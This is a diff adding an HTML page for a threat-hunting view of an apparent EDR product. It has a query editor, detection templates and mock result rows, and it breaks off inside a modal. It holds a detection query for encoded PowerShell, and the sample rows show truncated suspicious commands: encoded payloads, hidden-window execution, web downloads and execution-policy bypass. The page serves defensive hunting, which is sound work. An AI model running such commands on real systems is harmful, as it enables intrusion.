@@ -1,0 +1,1817 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>威胁狩猎 - H-System EDR平台</title>
+    <style>
+        /* 基础样式 */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Microsoft YaHei", sans-serif;
+        }
+
+        body {
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+            background-color: #f5f7fa;
+        }
+
+        /* 左侧菜单栏 */
+        .sidebar {
+            width: 220px;
+            background-color: #2c3e50;
+            color: white;
+            height: 100%;
+            transition: all 0.3s;
+            overflow-y: auto;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #34495e;
+        }
+
+        .sidebar-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .menu-item {
+            padding: 15px 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            border-left: 3px solid transparent;
+            text-decoration: none;
+            color: white;
+        }
+
+        .menu-item:hover {
+            background-color: #34495e;
+        }
+
+        .menu-item.active {
+            background-color: #34495e;
+            border-left-color: #3498db;
+        }
+
+        .menu-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+        }
+
+        /* 右侧主内容区 */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .top-bar {
+            height: 60px;
+            background-color: white;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .user-info img {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            margin-right: 10px;
+            background-color: #ecf0f1;
+        }
+
+        .content-area {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            background-color: #f5f7fa;
+        }
+
+        /* 页面通用样式 */
+        .page-title {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .card {
+            background-color: white;
+            border-radius: 6px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .panel-header {
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .panel-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        .panel-content {
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        /* 狩猎查询区域 */
+        .hunting-query {
+            margin-bottom: 25px;
+        }
+
+        .query-editor {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .query-bar {
+            display: flex;
+            gap: 10px;
+        }
+
+        .query-input {
+            flex: 1;
+            padding: 10px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: monospace;
+        }
+
+        .query-tabs {
+            display: flex;
+            border-bottom: 1px solid #ecf0f1;
+            margin-bottom: 15px;
+        }
+
+        .query-tab {
+            padding: 8px 15px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .query-tab.active {
+            border-bottom-color: #3498db;
+            color: #3498db;
+            font-weight: 500;
+        }
+
+        .query-builder {
+            background-color: #f8fafc;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .condition-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+            align-items: center;
+        }
+
+        .condition-select {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            width: 180px;
+        }
+
+        .condition-input {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            flex: 1;
+        }
+
+        .condition-remove {
+            color: #e74c3c;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .condition-add {
+            color: #27ae60;
+            background: none;
+            border: 1px dashed #27ae60;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* 狩猎模板区域 */
+        .hunting-templates {
+            margin-bottom: 25px;
+        }
+
+        .template-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+        }
+
+        .template-card {
+            border: 1px solid #ecf0f1;
+            border-radius: 6px;
+            padding: 15px;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .template-card:hover {
+            border-color: #3498db;
+            box-shadow: 0 2px 8px rgba(52, 152, 219, 0.15);
+        }
+
+        .template-title {
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .template-description {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+
+        .template-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* 狩猎结果区域 */
+        .hunting-results {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .results-stats {
+            display: flex;
+            gap: 20px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 20px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .results-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .results-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+
+        .results-table th,
+        .results-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #f1f3f5;
+        }
+
+        .results-table th {
+            background-color: #f8fafc;
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .results-table tr:hover {
+            background-color: #f8fafc;
+        }
+
+        .results-table .severity {
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .severity-critical {
+            background-color: #fee2e2;
+            color: #dc2626;
+        }
+
+        .severity-high {
+            background-color: #fed7d7;
+            color: #b91c1c;
+        }
+
+        .severity-medium {
+            background-color: #fef3c7;
+            color: #d97706;
+        }
+
+        .severity-low {
+            background-color: #dbeafe;
+            color: #1e40af;
+        }
+
+        .result-actions {
+            display: flex;
+            gap: 5px;
+        }
+
+        .result-action-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+            transition: color 0.2s;
+        }
+
+        .result-action-btn:hover {
+            color: #3498db;
+        }
+
+        /* 狩猎活动区域 */
+        .hunting-activities {
+            margin-bottom: 25px;
+        }
+
+        .activity-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .activity-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            border-radius: 6px;
+            background-color: #f8fafc;
+            transition: background-color 0.2s;
+        }
+
+        .activity-item:hover {
+            background-color: #f1f7fd;
+        }
+
+        .activity-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: #eef2f7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: #3498db;
+        }
+
+        .activity-details {
+            flex: 1;
+        }
+
+        .activity-title {
+            font-weight: 500;
+            margin-bottom: 3px;
+        }
+
+        .activity-meta {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .activity-status {
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 12px;
+        }
+
+        .status-running {
+            background-color: #dbeafe;
+            color: #1e40af;
+        }
+
+        .status-completed {
+            background-color: #dcfce7;
+            color: #166534;
+        }
+
+        .status-failed {
+            background-color: #fee2e2;
+            color: #dc2626;
+        }
+
+        /* 按钮样式 */
+        .btn {
+            padding: 6px 12px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .btn-primary {
+            background-color: #3498db;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #2980b9;
+        }
+
+        .btn-danger {
+            background-color: #e74c3c;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background-color: #c0392b;
+        }
+
+        .btn-warning {
+            background-color: #f39c12;
+            color: white;
+        }
+
+        .btn-warning:hover {
+            background-color: #d35400;
+        }
+
+        .btn-outline {
+            background-color: transparent;
+            border: 1px solid #3498db;
+            color: #3498db;
+        }
+
+        .btn-outline:hover {
+            background-color: #3498db;
+            color: white;
+        }
+
+        /* 弹窗样式 */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 6px;
+            width: 80%;
+            max-width: 800px;
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+
+        .modal-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .modal-header h3 {
+            font-size: 18px;
+            color: #2c3e50;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .modal-footer {
+            padding: 15px 20px;
+            border-top: 1px solid #ecf0f1;
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+
+        /* 表单样式 */
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+            color: #495057;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        textarea.form-control {
+            min-height: 100px;
+            resize: vertical;
+            font-family: monospace;
+        }
+
+        /* 提示消息样式 */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            z-index: 9999;
+            animation: fadeIn 0.3s, fadeOut 0.3s 2.7s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        /* 图表容器 */
+        .chart-container {
+            height: 250px;
+            margin-bottom: 20px;
+        }
+
+        /* 标签样式 */
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-right: 5px;
+        }
+
+        .tag-tactic {
+            background-color: #e0e7ff;
+            color: #4338ca;
+        }
+
+        /* 分页样式 */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            gap: 5px;
+        }
+
+        .page-btn {
+            padding: 5px 12px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            background-color: white;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .page-btn:hover {
+            border-color: #3498db;
+            color: #3498db;
+        }
+
+        .page-btn.active {
+            background-color: #3498db;
+            color: white;
+            border-color: #3498db;
+        }
+
+        /* 语法高亮样式 */
+        .syntax-keyword {
+            color: #0000ff;
+        }
+
+        .syntax-function {
+            color: #795e26;
+        }
+
+        .syntax-string {
+            color: #a31515;
+        }
+
+        .syntax-number {
+            color: #098658;
+        }
+
+        .syntax-comment {
+            color: #008000;
+        }
+    </style>
+    <!-- 引入Font Awesome图标库 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- 引入Chart.js用于图表展示 -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+    <!-- 左侧菜单栏 -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h1>H-System EDR平台</h1>
+        </div>
+        <div class="menu-list">
+            <a href="index.html" class="menu-item">
+                <i class="fas fa-tachometer-alt"></i>
+                <span>安全态势</span>
+            </a>
+            <a href="alert-center.html" class="menu-item">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>告警中心</span>
+            </a>
+            <a href="investigation.html" class="menu-item">
+                <i class="fas fa-search"></i>
+                <span>调查与响应</span>
+            </a>
+            <a href="asset-management.html" class="menu-item">
+                <i class="fas fa-desktop"></i>
+                <span>资产管理</span>
+            </a>
+            <a href="threat-hunting.html" class="menu-item active">
+                <i class="fas fa-crosshairs"></i>
+                <span>威胁狩猎</span>
+            </a>
+            <a href="threat-intelligence.html" class="menu-item">
+                <i class="fas fa-shield-alt"></i>
+                <span>威胁情报</span>
+            </a>
+            <a href="report-center.html" class="menu-item">
+                <i class="fas fa-file-alt"></i>
+                <span>报告中心</span>
+            </a>
+            <a href="system-management.html" class="menu-item">
+                <i class="fas fa-cog"></i>
+                <span>系统管理</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- 右侧主内容区 -->
+    <div class="main-container">
+        <div class="top-bar">
+            <div class="breadcrumbs">当前位置: <span id="breadcrumb">威胁狩猎</span></div>
+            <div class="user-info">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='30' r='20' fill='%233498db'/%3E%3Cpath d='M10,90 C10,65 30,55 50,55 C70,55 90,65 90,90' fill='%233498db'/%3E%3C/svg%3E" alt="用户头像">
+                <span>安全分析师</span>
+            </div>
+        </div>
+
+        <div class="content-area">
+            <h2 class="page-title">威胁狩猎</h2>
+
+            <!-- 狩猎统计概览 -->
+            <div class="card" style="margin-bottom: 25px;">
+                <div class="panel-header">
+                    <div class="panel-title">狩猎活动概览</div>
+                </div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;">
+                    <div style="background-color: #f8fafc; padding: 15px; border-radius: 6px; text-align: center;">
+                        <div style="font-size: 28px; font-weight: 600; color: #3498db; margin-bottom: 5px;">24</div>
+                        <div style="color: #666; font-size: 14px;">活跃狩猎任务</div>
+                    </div>
+                    <div style="background-color: #f8fafc; padding: 15px; border-radius: 6px; text-align: center;">
+                        <div style="font-size: 28px; font-weight: 600; color: #27ae60; margin-bottom: 5px;">128</div>
+                        <div style="color: #666; font-size: 14px;">已完成狩猎任务</div>
+                    </div>
+                    <div style="background-color: #f8fafc; padding: 15px; border-radius: 6px; text-align: center;">
+                        <div style="font-size: 28px; font-weight: 600; color: #e74c3c; margin-bottom: 5px;">17</div>
+                        <div style="color: #666; font-size: 14px;">发现的威胁数</div>
+                    </div>
+                    <div style="background-color: #f8fafc; padding: 15px; border-radius: 6px; text-align: center;">
+                        <div style="font-size: 28px; font-weight: 600; color: #f39c12; margin-bottom: 5px;">86%</div>
+                        <div style="color: #666; font-size: 14px;">威胁确认率</div>
+                    </div>
+                </div>
+                <div class="chart-container" style="margin-top: 20px;">
+                    <canvas id="huntingTrendsChart"></canvas>
+                </div>
+            </div>
+
+            <!-- 狩猎查询编辑器 -->
+            <div class="card hunting-query">
+                <div class="panel-header">
+                    <div class="panel-title">威胁狩猎查询</div>
+                    <button class="btn btn-outline" onclick="showQueryHelp()"><i class="fas fa-question-circle"></i> 查询帮助</button>
+                </div>
+                <div class="query-editor">
+                    <div class="query-tabs">
+                        <div class="query-tab active" onclick="switchQueryMode('advanced')">高级查询</div>
+                        <div class="query-tab" onclick="switchQueryMode('builder')">条件构建器</div>
+                    </div>
+
+                    <!-- 高级查询模式 -->
+                    <div id="advanced-query" class="query-mode">
+                        <div class="query-bar">
+                            <input type="text" class="query-input" id="hunting-query-input" 
+                                placeholder="输入狩猎查询语句，例如：process where name == 'powershell.exe' and command_line contains '-EncodedCommand'"
+                                value="process
+where name == 'powershell.exe'
+  and command_line contains '-EncodedCommand'
+  and user != 'SYSTEM'
+  and create_time > now(-24h)
+project timestamp, name, user, command_line, host_name
+sort by timestamp desc">
+                            <button class="btn btn-primary" onclick="runHuntingQuery()"><i class="fas fa-play"></i> 运行</button>
+                            <button class="btn btn-outline" onclick="saveQueryAsTemplate()"><i class="fas fa-save"></i> 保存</button>
+                        </div>
+                        <div style="font-size: 13px; color: #666; margin-top: -5px;">
+                            示例: <span style="color: #3498db; cursor: pointer;" onclick="loadExampleQuery(1)">PowerShell编码命令</span> | 
+                            <span style="color: #3498db; cursor: pointer;" onclick="loadExampleQuery(2)">可疑注册表操作</span> | 
+                            <span style="color: #3498db; cursor: pointer;" onclick="loadExampleQuery(3)">异常网络连接</span>
+                        </div>
+                    </div>
+
+                    <!-- 条件构建器模式 -->
+                    <div id="builder-query" class="query-mode" style="display: none;">
+                        <div class="query-builder">
+                            <div class="condition-group">
+                                <select class="condition-select">
+                                    <option value="process">进程事件</option>
+                                    <option value="network">网络事件</option>
+                                    <option value="file">文件事件</option>
+                                    <option value="registry">注册表事件</option>
+                                    <option value="login">登录事件</option>
+                                </select>
+                                <select class="condition-select">
+                                    <option value="name">名称</option>
+                                    <option value="path">路径</option>
+                                    <option value="command_line">命令行</option>
+                                    <option value="user">用户</option>
+                                    <option value="pid">进程ID</option>
+                                </select>
+                                <select class="condition-select">
+                                    <option value="contains">包含</option>
+                                    <option value="equals">等于</option>
+                                    <option value="notequals">不等于</option>
+                                    <option value="startswith">以...开始</option>
+                                    <option value="endswith">以...结束</option>
+                                </select>
+                                <input type="text" class="condition-input" placeholder="值">
+                                <button class="condition-remove" onclick="removeCondition(this)"><i class="fas fa-times"></i></button>
+                            </div>
+                            <button class="condition-add" onclick="addCondition()"><i class="fas fa-plus"></i> 添加条件</button>
+                        </div>
+                        <div class="query-bar">
+                            <input type="text" class="query-input" id="builder-query-result" placeholder="生成的查询将显示在这里" readonly>
+                            <button class="btn btn-primary" onclick="runBuilderQuery()"><i class="fas fa-play"></i> 运行</button>
+                            <button class="btn btn-outline" onclick="saveQueryAsTemplate()"><i class="fas fa-save"></i> 保存</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 狩猎模板 -->
+            <div class="card hunting-templates">
+                <div class="panel-header">
+                    <div class="panel-title">狩猎模板库</div>
+                    <button class="btn btn-primary" onclick="openNewTemplateModal()"><i class="fas fa-plus"></i> 新建模板</button>
+                </div>
+                <div class="template-list">
+                    <div class="template-card" onclick="loadTemplate(1)">
+                        <div class="template-title">
+                            <span>Emotet恶意软件狩猎</span>
+                            <i class="fas fa-chevron-right" style="color: #ccc;"></i>
+                        </div>
+                        <div class="template-description">
+                            检测与Emotet恶意软件相关的行为特征，包括可疑进程、C2通信和持久化机制。
+                        </div>
+                        <div>
+                            <span class="tag tag-tactic">初始访问</span>
+                            <span class="tag tag-tactic">命令与控制</span>
+                        </div>
+                        <div class="template-meta">
+                            <span>更新于: 2025-08-20</span>
+                            <span>使用次数: 32</span>
+                        </div>
+                    </div>
+                    <div class="template-card" onclick="loadTemplate(2)">
+                        <div class="template-title">
+                            <span>横向移动检测</span>
+                            <i class="fas fa-chevron-right" style="color: #ccc;"></i>
+                        </div>
+                        <div class="template-description">
+                            搜索可能的横向移动活动，包括异常的远程登录、WMI和PowerShell远程执行。
+                        </div>
+                        <div>
+                            <span class="tag tag-tactic">横向移动</span>
+                            <span class="tag tag-tactic">凭证访问</span>
+                        </div>
+                        <div class="template-meta">
+                            <span>更新于: 2025-08-15</span>
+                            <span>使用次数: 47</span>
+                        </div>
+                    </div>
+                    <div class="template-card" onclick="loadTemplate(3)">
+                        <div class="template-title">
+                            <span>可疑PowerShell活动</span>
+                            <i class="fas fa-chevron-right" style="color: #ccc;"></i>
+                        </div>
+                        <div class="template-description">
+                            检测异常的PowerShell使用，包括编码命令、无文件执行和可疑参数组合。
+                        </div>
+                        <div>
+                            <span class="tag tag-tactic">执行</span>
+                            <span class="tag tag-tactic">无文件攻击</span>
+                        </div>
+                        <div class="template-meta">
+                            <span>更新于: 2025-08-25</span>
+                            <span>使用次数: 63</span>
+                        </div>
+                    </div>
+                    <div class="template-card" onclick="loadTemplate(4)">
+                        <div class="template-title">
+                            <span>持久化机制检测</span>
+                            <i class="fas fa-chevron-right" style="color: #ccc;"></i>
+                        </div>
+                        <div class="template-description">
+                            搜索常见的恶意软件持久化技术，包括注册表Run键、计划任务和服务篡改。
+                        </div>
+                        <div>
+                            <span class="tag tag-tactic">持久化</span>
+                            <span class="tag tag-tactic">防御规避</span>
+                        </div>
+                        <div class="template-meta">
+                            <span>更新于: 2025-08-10</span>
+                            <span>使用次数: 29</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 狩猎结果 -->
+            <div class="card hunting-results">
+                <div class="panel-header">
+                    <div class="panel-title">狩猎结果</div>
+                    <div>
+                        <select class="form-control" style="width: auto; display: inline-block;" onchange="changeResultsView(this.value)">
+                            <option value="table">表格视图</option>
+                            <option value="chart">图表视图</option>
+                            <option value="raw">原始数据</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="results-header">
+                    <div class="results-stats">
+                        <div class="stat-item">
+                            <div class="stat-value">247</div>
+                            <div class="stat-label">总结果数</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value">12</div>
+                            <div class="stat-label">高风险</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value">38</div>
+                            <div class="stat-label">中风险</div>
+                        </div>
+                        <div class="stat-item">
+                            <div class="stat-value">00:02:45</div>
+                            <div class="stat-label">查询耗时</div>
+                        </div>
+                    </div>
+                    <div class="results-actions">
+                        <button class="btn btn-outline" onclick="exportResults()"><i class="fas fa-download"></i> 导出</button>
+                        <button class="btn btn-outline" onclick="saveResults()"><i class="fas fa-save"></i> 保存</button>
+                        <button class="btn btn-primary" onclick="createInvestigationFromResults()"><i class="fas fa-search-plus"></i> 新建调查</button>
+                    </div>
+                </div>
+
+                <div class="results-table-container">
+                    <table class="results-table">
+                        <thead>
+                            <tr>
+                                <th>时间戳</th>
+                                <th>主机名</th>
+                                <th>进程名</th>
+                                <th>用户</th>
+                                <th>命令行</th>
+                                <th>风险级别</th>
+                                <th>操作</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr onclick="showResultDetails(1)">
+                                <td>2025-08-27 15:43:22</td>
+                                <td>WIN-SERVER-01</td>
+                                <td>powershell.exe</td>
+                                <td>admin</td>
+                                <td>powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPA...</td>
+                                <td><span class="severity severity-high">高风险</span></td>
+                                <td class="result-actions">
+                                    <button class="result-action-btn" title="查看详情"><i class="fas fa-info-circle"></i></button>
+                                    <button class="result-action-btn" title="添加到调查"><i class="fas fa-plus-circle"></i></button>
+                                    <button class="result-action-btn" title="标记为威胁"><i class="fas fa-flag"></i></button>
+                                </td>
+                            </tr>
+                            <tr onclick="showResultDetails(2)">
+                                <td>2025-08-27 15:38:15</td>
+                                <td>DESKTOP-8F3K29A</td>
+                                <td>powershell.exe</td>
+                                <td>user1</td>
+                                <td>powershell.exe -NonInteractive -WindowStyle Hidden -Exec...</td>
+                                <td><span class="severity severity-high">高风险</span></td>
+                                <td class="result-actions">
+                                    <button class="result-action-btn" title="查看详情"><i class="fas fa-info-circle"></i></button>
+                                    <button class="result-action-btn" title="添加到调查"><i class="fas fa-plus-circle"></i></button>
+                                    <button class="result-action-btn" title="标记为威胁"><i class="fas fa-flag"></i></button>
+                                </td>
+                            </tr>
+                            <tr onclick="showResultDetails(3)">
+                                <td>2025-08-27 15:22:08</td>
+                                <td>SRV-DB-02</td>
+                                <td>powershell.exe</td>
+                                <td>svc_sql</td>
+                                <td>powershell.exe -Command Invoke-WebRequest -Uri http://...</td>
+                                <td><span class="severity severity-medium">中风险</span></td>
+                                <td class="result-actions">
+                                    <button class="result-action-btn" title="查看详情"><i class="fas fa-info-circle"></i></button>
+                                    <button class="result-action-btn" title="添加到调查"><i class="fas fa-plus-circle"></i></button>
+                                    <button class="result-action-btn" title="标记为威胁"><i class="fas fa-flag"></i></button>
+                                </td>
+                            </tr>
+                            <tr onclick="showResultDetails(4)">
+                                <td>2025-08-27 15:10:53</td>
+                                <td>WIN-SERVER-01</td>
+                                <td>powershell.exe</td>
+                                <td>admin</td>
+                                <td>powershell.exe -ExecutionPolicy Bypass -File C:\Temp\up...</td>
+                                <td><span class="severity severity-medium">中风险</span></td>
+                                <td class="result-actions">
+                                    <button class="result-action-btn" title="查看详情"><i class="fas fa-info-circle"></i></button>
+                                    <button class="result-action-btn" title="添加到调查"><i class="fas fa-plus-circle"></i></button>
+                                    <button class="result-action-btn" title="标记为威胁"><i class="fas fa-flag"></i></button>
+                                </td>
+                            </tr>
+                            <tr onclick="showResultDetails(5)">
+                                <td>2025-08-27 14:55:37</td>
+                                <td>DESKTOP-USER05</td>
+                                <td>powershell.exe</td>
+                                <td>user5</td>
+                                <td>powershell.exe Get-ChildItem -Path C:\ -Recurse -Filte...</td>
+                                <td><span class="severity severity-low">低风险</span></td>
+                                <td class="result-actions">
+                                    <button class="result-action-btn" title="查看详情"><i class="fas fa-info-circle"></i></button>
+                                    <button class="result-action-btn" title="添加到调查"><i class="fas fa-plus-circle"></i></button>
+                                    <button class="result-action-btn" title="标记为威胁"><i class="fas fa-flag"></i></button>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="pagination">
+                    <button class="page-btn"><i class="fas fa-chevron-left"></i></button>
+                    <button class="page-btn active">1</button>
+                    <button class="page-btn">2</button>
+                    <button class="page-btn">3</button>
+                    <button class="page-btn">4</button>
+                    <button class="page-btn">5</button>
+                    <button class="page-btn"><i class="fas fa-chevron-right"></i></button>
+                </div>
+            </div>
+
+            <!-- 最近狩猎活动 -->
+            <div class="card hunting-activities">
+                <div class="panel-header">
+                    <div class="panel-title">最近狩猎活动</div>
+                </div>
+                <div class="activity-list">
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <i class="fas fa-search"></i>
+                        </div>
+                        <div class="activity-details">
+                            <div class="activity-title">PowerShell编码命令狩猎</div>
+                            <div class="activity-meta">由 安全分析师 启动 · 2分钟前 · 发现12个高风险结果</div>
+                        </div>
+                        <div class="activity-status status-completed">已完成</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <i class="fas fa-search"></i>
+                        </div>
+                        <div class="activity-details">
+                            <div class="activity-title">Emotet恶意软件IOC匹配</div>
+                            <div class="activity-meta">由 安全分析师 启动 · 15分钟前 · 发现3个高风险结果</div>
+                        </div>
+                        <div class="activity-status status-completed">已完成</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <i class="fas fa-search"></i>
+                        </div>
+                        <div class="activity-details">
+                            <div class="activity-title">横向移动检测</div>
+                            <div class="activity-meta">由 安全主管 启动 · 1小时前 · 正在运行中</div>
+                        </div>
+                        <div class="activity-status status-running">运行中</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <i class="fas fa-search"></i>
+                        </div>
+                        <div class="activity-details">
+                            <div class="activity-title">可疑注册表修改检测</div>
+                            <div class="activity-meta">由 安全分析师 启动 · 3小时前 · 查询超时</div>
+                        </div>
+                        <div class="activity-status status-failed">已失败</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 新建模板弹窗 -->
+    <div class="modal" id="newTemplateModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>新建狩猎模板</h3>
+                <button class="modal-close" onclick="closeNewTemplateModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="template-name">模板名称</label>
+                    <input type="text" id="template-name" class="form-control" placeholder="例如：可疑PowerShell活动检测">
+                </div>
+                <div class="form-group">
+                    <label for="template-description">模板描述</label>
+                    <textarea id="template-description" class="form-control" placeholder="描述此模板的用途、检测逻辑和适用场景..."></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="template-tactics">ATT&CK战术</label>
+                    <select id="template-tactics" class="form-control" multiple size="5">
+                        <option value="initial-access">初始访问</option>
+                        <option value="execution">执行</option>
+                        <option value="persistence">持久化</option>
+                        <option value="privilege-escalation">权限提升</option>
+                        <option value="defense-evasion">防御规避</option>
+                        <option value="credential-access">凭证访问</option>
+                        <option value="discovery">信息收集</option>
+                        <option value="lateral-movement">横向移动</option>
+                        <option value="command-and-control">命令与控制</option>
+                        <option value="exfiltration">数据渗出</option>
+                        <option value="impact">影响</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="template-query">狩猎查询语句</label>
+                    <textarea id="template-query" class="form-control" placeholder="输入狩猎查询语句..."></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="template-tags">标签（用逗号分隔）</label>
+                    <input type="text" id="template-tags" class="form-control" placeholder="例如：powershell,编码命令,防御规避">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeNewTemplateModal()">取消</button>
+                <button class="btn btn-primary" onclick="saveNewTemplate()">保存模板</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 结果详情弹窗 -->
+    <div class="modal" id="resultDetailsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>狩猎结果详情</h3>
